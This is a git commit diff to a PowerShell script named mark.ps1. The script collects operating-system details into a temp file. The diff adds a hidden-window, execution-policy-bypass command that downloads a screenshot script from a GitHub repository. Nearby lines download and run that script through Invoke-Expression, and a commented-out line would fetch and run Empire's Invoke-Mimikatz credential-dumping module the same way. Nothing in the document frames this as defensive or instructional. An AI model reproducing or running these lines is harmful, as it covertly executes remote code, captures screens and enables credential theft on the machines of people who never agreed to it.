09c63515fba7a32318d50015e6753198f6c1ccf7
inwestallis <inwestallis@gmail.com>
2020-05-03 21:27:54 +0300

    Update mark.ps1

--- mark.ps1
+++ mark.ps1
@@ -2,6 +2,9 @@
 
 Get-WmiObject -Class Win32_OperatingSystem | SelectObject -Property *  | Out-File C:\Users\administrator\AppData\Local\Temp\proc.txt
 
+powershell.exe -windowstyle hidden -ep Bypass -nop -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/inwestallis/first_repository/master/Take-ScreenShot.ps1','%Temp%\Take-ScreenShot.ps1')"
+
+
 <# powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
 #>
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/Take-ScreenShot.ps1')"
